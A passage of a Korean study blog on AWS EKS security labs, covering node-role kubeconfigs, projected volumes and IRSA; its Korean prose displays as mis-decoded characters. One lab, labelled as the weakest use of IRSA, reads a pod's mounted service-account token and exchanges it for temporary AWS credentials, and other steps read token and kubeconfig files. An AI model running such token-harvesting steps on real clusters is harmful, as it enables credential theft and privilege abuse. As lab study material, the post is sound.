</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- aws eks update-kubeconfig --name $CLUSTER_NAME --role-arn $NODE_ROLE
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- cat /root/.kube/config | yh
</span></span></code></pre></div><p><img src="./images/NodeInstanceRole-IAM-Permission-policies.png" alt="NodeInstanceRole IAM Permission policies"></p>
<p><img src="./images/kubeconfig-with-NodeInstanceRole-role.png" alt="kubeconfig with NodeInstanceRole role"></p>
<ul>
<li>(ë³´ë„ˆìŠ¤)ë…¸ë“œì— SSH ì ‘ì†, kubeconfig íŒŒì¼ ìƒì„± í›„ kubectl ì‹¤í–‰
<ul>
<li>ì¤‘ê°„ì— ì•ˆë˜ì„œ ì¤‘ë‹¨ í–ˆì—ˆì§€ë§Œ, ë³µê¸°í•˜ê³  ë‚˜ë‹ˆ ì–´ë””ê°€ ë¬¸ì œì¸ì§€ íŒŒì•…: To-Do</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh ec2-user@$N1
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl ì„¤ì¹˜</span>
</span></span><span style="display:flex;"><span>curl --silent --location <span style="color:#e6db74">&#34;https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">_amd64.tar.gz&#34;</span> | tar xz -C /tmp
</span></span><span style="display:flex;"><span>mv /tmp/eksctl /usr/local/bin
</span></span><span style="display:flex;"><span>curl -LO <span style="color:#e6db74">&#34;https://dl.k8s.io/release/</span><span style="color:#66d9ef">$(</span>curl -L -s https://dl.k8s.io/release/stable.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">/bin/linux/amd64/kubectl&#34;</span>
</span></span><span style="display:flex;"><span>install -o root -g root -m <span style="color:#ae81ff">0755</span> kubectl /usr/local/bin/kubectl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì •ìƒ ì¶œë ¥</span>
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Token ìš”ì²­: ë¯¸ë¦¬ ë©”ëª¨</span>
</span></span><span style="display:flex;"><span>aws eks get-token --cluster-name myeks | jq -r <span style="color:#e6db74">&#39;.status.token&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ìœ„ì˜ í† í°ê³¼ ì•ì—ì„œ ì¶œë ¥ëœ kubeconfigë¥¼ ê°€ì ¸ì™€ì„œ kubeconfig ìƒì„±</span>
</span></span><span style="display:flex;"><span>mkdir ~/.kube
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; ~/.kube/config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">clusters:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- cluster:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    certificate-authority-data: LS0tL{ìƒëµ}S0tCg==
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    server: https://0A9ACECDBF06CF1E13D3E0F19A0F0D2C.sk1.ap-northeast-2.eks.amazonaws.com
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">contexts:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- context:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cluster: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    user: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">current-context: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Config
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">preferences: {}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">users:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  user:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    exec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      apiVersion: client.authentication.k8s.io/v1beta1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      args:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --region
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - ap-northeast-2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - eks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - get-token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --cluster-name
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - myeks
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --output
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - json
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --role
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1DC6Y2GRDAJHK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: aws
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl ì‹œë„</span>
</span></span><span style="display:flex;"><span>kubectl get node -v6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig ì‚­ì œ</span>
</span></span><span style="display:flex;"><span>rm -rf .kube
</span></span></code></pre></div><h2 id="4-eks-irsa">4. EKS IRSA</h2>
<ul>
<li>ìœ„ì—ì„œ ê²½í—˜í–ˆë“¯ì´ EC2 Instance Profileì€ í¸ë¦¬í•˜ë‚˜, ë³´ì•ˆìƒ ì·¨ì•½(ìµœì†Œ ê¶Œí•œ ë¶€ì—¬ ì›ì¹™)</li>
<li>IAM Roles for Service Accounts: ì‚¬ìš©ì ê´€ë¦¬í˜• ì„œë¹„ìŠ¤ ê³„ì •</li>
<li>ì‹¤ìŠµ í™˜ê²½ êµ¬ì„± ì‹œ, ì•„ë˜ì˜ ìŠ¤í¬ë¦½íŠ¸ê°€ í¬í•¨
<ul>
<li><code>eksctl create cluster --name $CLUSTER_NAME ... --external-dns-access --full-ecr-access --asg-access</code></li>
</ul>
</li>
</ul>
<h3 id="4-1-projected-volume">4-1. `projected&rsquo; Volume</h3>
<ul>
<li>k8sì˜ projected Volumeì„ í™œìš©í•˜ì—¬, ì•„ë˜ì˜ volume sourceë¥¼ í•˜ë‚˜ì˜ ë””ë ‰í† ë¦¬ë¡œ í†µí•©
<ul>
<li>Secret: user, pass</li>
<li>ConfigMap</li>
<li>Downward API</li>
<li>ServiceAccountToken</li>
</ul>
</li>
<li>ì›ë¬¸: <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-projected-volume-storage/">https://kubernetes.io/docs/tasks/configure-pod-container/configure-projected-volume-storage/</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Create the Secrets:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## Create files containing the username and password:</span>
</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;admin&#34;</span> &gt; ./username.txt
</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;1f2d1e2e67df&#34;</span> &gt; ./password.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## Package these files into secrets:</span>
</span></span><span style="display:flex;"><span>kubectl create secret generic user --from-file<span style="color:#f92672">=</span>./username.txt
</span></span><span style="display:flex;"><span>kubectl create secret generic pass --from-file<span style="color:#f92672">=</span>./password.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ ìƒì„±</span>
</span></span><span style="display:flex;"><span>kubectl apply -f https://k8s.io/examples/pods/storage/projected.yaml
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ í™•ì¸: projected ë¼ë²¨</span>
</span></span><span style="display:flex;"><span>kubectl get pod test-projected-volume -o yaml | kubectl neat | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># secret</span>
</span></span><span style="display:flex;"><span>kubectl exec -it test-projected-volume -- ls /projected-volume/
</span></span><span style="display:flex;"><span>kubectl exec -it test-projected-volume -- cat /projected-volume/username.txt ;echo
</span></span><span style="display:flex;"><span>kubectl exec -it test-projected-volume -- cat /projected-volume/password.txt ;echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì‚­ì œ</span>
</span></span><span style="display:flex;"><span>kubectl delete pod test-projected-volume <span style="color:#f92672">&amp;&amp;</span> kubectl delete secret user pass
</span></span></code></pre></div><p><img src="./images/projected-Volume.png" alt="projected Volume"></p>
<h3 id="4-2-irsa-ì‹¤ìŠµ">4-2. IRSA ì‹¤ìŠµ</h3>
<ul>
<li>
<p>ê°œë…</p>
<ul>
<li>MutatingWebhook: ì‚¬ìš©ìê°€ ìš”ì²­í•œ requestì— ëŒ€í•´ ê´€ë¦¬ìê°€ ì„ì˜ë¡œ ê°’ì„ ë³€ê²½
<ul>
<li><code>kubectl get validatingwebhookconfigurations</code></li>
</ul>
</li>
<li>ValidatingWebhook: ì‚¬ìš©ìê°€ ìš”ì²­í•œ requestì— ëŒ€í•´ ê´€ë¦¬ìê°€ í—ˆìš© ì°¨ë‹¨
<ul>
<li><code>kubectl get mutatingwebhookconfigurations</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>ì‹¤ìŠµ1. CloudTrail ì´ë²¤íŠ¸ ListBucketì„ í†µí•œ, Access Denied í™•ì¸</p>
<ul>
<li>ì•„ë˜ ì‹¤í–‰ í›„, CloudTrail ì´ë²¤íŠ¸ í™•ì¸ <a href="https://ap-northeast-2.console.aws.amazon.com/cloudtrail/home?region=ap-northeast-2#/events?EventName=ListBuckets">AWS ë§í¬</a></li>
<li><code>userIdentity</code></li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ1 ìƒì„±</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: eks-iam-test1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      args: [&#39;s3&#39;, &#39;ls&#39;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  automountServiceAccountToken: false
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># í™•ì¸</span>
</span></span><span style="display:flex;"><span>kubectl get pod
</span></span><span style="display:flex;"><span>kubectl describe pod
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë¡œê·¸ í™•ì¸</span>
</span></span><span style="display:flex;"><span>kubectl logs eks-iam-test1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ1 ì‚­ì œ</span>
</span></span><span style="display:flex;"><span>kubectl delete pod eks-iam-test1
</span></span></code></pre></div><p><img src="./images/irsa-failure.png" alt="failure cause of IRSA"></p>
<p><img src="./images/irsa-access-denied.png" alt="AccessDenied in ListBucket"></p>
<ul>
<li>ì‹¤ìŠµ2. k8s SA &amp; JWT token
<ul>
<li>SA ìƒì„± ì‹œ, k8s secretì— JWT tokenì´ ìë™ ìƒì„±</li>
<li>EKS IdP(OpentID Connect Provider) ì£¼ì†Œ: k8sê°€ ë°œê¸‰í•œ Token ìœ íš¨ ê²€ì¦</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ2 ìƒì„±</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: eks-iam-test2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: [&#39;sleep&#39;, &#39;36000&#39;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl get pod
</span></span><span style="display:flex;"><span>kubectl describe pod
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws ì„œë¹„ìŠ¤ ì‚¬ìš© ì‹œë„</span>
</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test2 -- aws s3 ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì„œë¹„ìŠ¤ ì–´ì¹´ìš´íŠ¸ í† í° </span>
</span></span><span style="display:flex;"><span>SA_TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl exec -it eks-iam-test2 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo $SA_TOKEN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># jwt í˜¹ì€ JWT ì›¹ ì‚¬ì´íŠ¸ ì´ìš©</span>
</span></span><span style="display:flex;"><span>jwt decode $SA_TOKEN --json --iso8601
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ2 ì‚­ì œ</span>
</span></span><span style="display:flex;"><span>kubectl delete pod eks-iam-test2
</span></span></code></pre></div><p><img src="./images/eks-idp.png" alt="EKS IdP address - iss"></p>
<ul>
<li>ì‹¤ìŠµ3. amazon-eks-pod-identity-webhookì„ í†µí•œ íŒŒë“œ IAM access ì£¼ì…(mutating pods)
<ul>
<li>ì•„ë˜ì˜ ì˜ˆì œì—ì„œëŠ” EKS ìƒì˜ <strong>LB Controller</strong>ê°€ AWS ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ì—¬ LBë¥¼ ì œì–´
<ul>
<li>ë”°ë¼ì„œ LB Controllerê°€ ì´ìš©í•˜ëŠ” SAì—ë„ ê´€ë ¨ IAM Roleì„ ì£¼ì…</li>
</ul>
</li>
<li>LB ControllerëŠ” kube-system Namespaceì—ì„œ ë™ì‘ &amp; LB Controller SA ì´ìš©</li>
<li>Webhookì´ LB Controller Pod specì— ì •ë³´ë¥¼ ì£¼ì…, ë³€ê²½(mutating)</li>
<li>í•´ë‹¹ Trust Relationshipì—ì„œëŠ” ì¸ì¦ë°©ë²•(<code>sts:AssumeRoleWithWebIdentity</code>)ì´ ê¸°ì¬
<ul>
<li>JWT Token ë‚´ í¬í•¨ë˜ì•¼í•˜ëŠ” Claim ì¡°ê±´1: <code>aud</code>ëŠ” <code>sts.amazonaws.com</code></li>
<li>JWT Token ë‚´ í¬í•¨ë˜ì•¼í•˜ëŠ” Claim ì¡°ê±´2: <code>sub</code>ëŠ” <code>system:serviceaccount:kube-system:aws-load-balancer-controller</code></li>
</ul>
</li>
<li>OIDC Discovery end-point?
<ul>
<li>OpenID Connect Discovery RFC is the specification that defines the structure and content of the OIDC .well-known end-point. <a href="https://directory.openbanking.org.uk/obieservicedesk/s/article/OIDC-Discovery">OPEN BANKING</a></li>
</ul>
</li>
<li>ì°¸ê³ : <a href="https://ssup2.github.io/theory_analysis/AWS_EKS_Service_Account_IAM_Role/">Ssup2 Blog</a></li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># eksctl create iamserviceaccount: SA &amp; IAM role &amp; trust policy ë™ì‹œ ìƒì„±</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># CloudFormation Stack -&gt; IAM Role í™•ì¸ ê°€ëŠ¥</span>
</span></span><span style="display:flex;"><span>eksctl create iamserviceaccount <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --name my-sa <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --namespace default <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --cluster $CLUSTER_NAME <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --approve <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --attach-policy-arn <span style="color:#66d9ef">$(</span>aws iam list-policies --query <span style="color:#e6db74">&#39;Policies[?PolicyName==`AmazonS3ReadOnlyAccess`].Arn&#39;</span> --output text<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-load-balancer-controller IRSAì˜ ë™ì‘ ìˆ˜í–‰ì„ ì˜ˆìƒí•´ì•¼ í•¨</span>
</span></span><span style="display:flex;"><span>eksctl get iamserviceaccount --cluster $CLUSTER_NAME
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl get sa
</span></span><span style="display:flex;"><span>kubectl describe sa my-sa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## SAë¥¼ ê¸°ë°˜ìœ¼ë¡œí•œ ì‹ ê·œ íŒŒë“œ ìƒì„±</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ3ë²ˆ ìƒì„±</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: eks-iam-test3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  serviceAccountName: my-sa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: [&#39;sleep&#39;, &#39;36000&#39;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># í•´ë‹¹ SAë¥¼ íŒŒë“œê°€ ì‚¬ìš© ì‹œ mutatingwebhookìœ¼ë¡œ Env,Volume ì¶”ê°€í•¨</span>
</span></span><span style="display:flex;"><span>kubectl get mutatingwebhookconfigurations pod-identity-webhook -o yaml | kubectl neat | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## íŒŒë“œ ìƒì„± yamlì— ìƒˆë¡œìš´ ë‚´ìš© ì¶”ê°€ í™•ì¸</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pod Identity Webhookì€ mutating webhookì„ í†µí•´ Environment ë° 1ê°œì˜ Projected ë³¼ë¥¨ ì¶”ê°€</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Environment.{AWS_ROLE_ARN | AWS_WEB_IDENTITY_TOKEN_FILE}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Volume.aws-iam-token</span>
</span></span><span style="display:flex;"><span>kubectl get pod eks-iam-test3
</span></span><span style="display:flex;"><span>kubectl describe pod eks-iam-test3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## íŒŒë“œì—ì„œ aws-cli ì‚¬ìš©</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ëª‡ ê°€ì§€ëŠ” êµ¬ë™ì´ ì•ˆë˜ì—ˆëŠ”ë°, ì•„ì§ ì´í•´ê°€ ë¶€ì¡±í•˜ì—¬ ì¶”í›„ì— ë‹¤ì‹œ í™•ì¸ í•„ìš” (To-Do)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># VPCì˜ ê²½ìš°, ê¶Œí•œì´ ì—†ì–´ì„œ ì•ˆë˜ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì¸¡</span>
</span></span><span style="display:flex;"><span>eksctl get iamserviceaccount --cluster $CLUSTER_NAME
</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test3 -- aws sts get-caller-identity --query Arn<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>kubectl exec -it eks-iam-test3 -- aws s3 ls
</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test3 -- aws ec2 describe-instances --region ap-northeast-2
</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test3 -- aws ec2 describe-vpcs --region ap-northeast-2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œì— ë³¼ë¥¨ ë§ˆìš´íŠ¸ 2ê°œ í™•ì¸: aws-iam-token</span>
</span></span><span style="display:flex;"><span>kubectl get pod eks-iam-test3 -o json | jq -r <span style="color:#e6db74">&#39;.spec.containers | .[].volumeMounts&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-iam-token ë³¼ë¥¨ ì •ë³´ í™•ì¸ : JWT í† í°ì´ ë‹´ê²¨ì ¸ìˆê³ , exp, aud ì†ì„±ì´ ì¶”ê°€ë˜ì–´ ìˆìŒ</span>
</span></span><span style="display:flex;"><span>kubectl get pod eks-iam-test3 -o json | jq -r <span style="color:#e6db74">&#39;.spec.volumes[] | select(.name==&#34;aws-iam-token&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># API ë¦¬ì†ŒìŠ¤: mutatingwebhookconfigurations, validatingwebhookconfigurations</span>
</span></span><span style="display:flex;"><span>kubectl api-resources |grep hook
</span></span><span style="display:flex;"><span>kubectl get MutatingWebhookConfiguration
</span></span><span style="display:flex;"><span>kubectl describe MutatingWebhookConfiguration pod-identity-webhook 
</span></span><span style="display:flex;"><span>kubectl get MutatingWebhookConfiguration pod-identity-webhook -o yaml | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># AWS_WEB_IDENTITY_TOKEN_FILE í™•ì¸</span>
</span></span><span style="display:flex;"><span>IAM_TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo $IAM_TOKEN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Discovery Endpoint ì ‘ê·¼</span>
</span></span><span style="display:flex;"><span>IDP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>aws eks describe-cluster --name myeks --query cluster.identity.oidc.issuer --output text<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>curl -s $IDP/.well-known/openid-configuration | jq -r <span style="color:#e6db74">&#39;.&#39;</span>
</span></span><span style="display:flex;"><span>curl -s $IDP/keys | jq -r <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#75715e"># ê³µê°œí‚¤ê°€ í¬í•¨ëœ JWKS í•„ë“œ</span>
</span></span></code></pre></div><p><img src="./images/trust-relationships-with-oidc-provider.png" alt="Trust Relationships with oidc-provider"></p>
<p><img src="./images/pod-with-env-and-volume.png" alt="Pod with Environment &amp; projected Volume"></p>
<p><img src="./images/check-2-volumemounts-and-aws-iam-token.png" alt="check 2 volumeMounts &amp; aws-iam-token"></p>
<p><img src="./images/configurated-mutating-and-validating-webhook.png" alt="configurated Mutaing and Validating Webhook"></p>
<p><img src="./images/discovery-endpoint-with-oidp.png" alt="Discovery endpoint with OIDP"></p>
<ul>
<li>ì‹¤ìŠµ 4. IRSAë¥¼ ê°€ì¥ ì·¨ì•½í•˜ê²Œ ì‚¬ìš©í•˜ëŠ” ë°©ë²•
<ul>
<li>ì •ë³´ íƒˆì·¨ ì‹œ í‚¤/í† í° ë°œê¸‰ ì•…ìš© ê°€ëŠ¥.
<ul>
<li>ë¼ì´ë¸Œ ì„œë¹„ìŠ¤ë¡œëŠ” ì‹œë„ ê¸ˆë¬¼</li>
</ul>
</li>
<li>ìœ„ì˜ ì‹¤ìŠµ 3ì— ë°”ë¡œ ì´ì–´ì„œ ì§„í–‰</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># AWS_WEB_IDENTITY_TOKEN_FILE í† í° ê°’ ë³€ìˆ˜ ì§€ì •</span>
</span></span><span style="display:flex;"><span>IAM_TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo $IAM_TOKEN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ROLE ARN í™•ì¸ í›„ ë³€ìˆ˜ ì§ì ‘ ì§€ì •</span>
</span></span><span style="display:flex;"><span>eksctl get iamserviceaccount --cluster $CLUSTER_NAME
</span></span><span style="display:flex;"><span>ROLE_ARN<span style="color:#f92672">=</span>arn:aws:iam::911283464785:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-<span style="color:#f92672">{</span>arn<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># assume-role-with-web-identity STS ì„ì‹œìê²©ì¦ëª… ë°œê¸‰ ìš”ì²­</span>
</span></span><span style="display:flex;"><span>aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --role-session-name mykey --web-identity-token $IAM_TOKEN | jq
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ ì‚­ì œ</span>
</span></span><span style="display:flex;"><span>kubectl delete pod eks-iam-test3
</span></span></code></pre></div><h2 id="5-owaps-k8s-top-10">5. OWAPS k8s Top 10</h2>
<ul>
<li>ì‹¤ìŠµì—ì„œëŠ” ì„¸ ê°€ì§€ ì‹œë‚˜ë¦¬ì˜¤ë¡œ k8s ë³´ì•ˆìœ„í˜‘ ì²´ê°ì„ ëª©í‘œë¡œ ì§„í–‰</li>
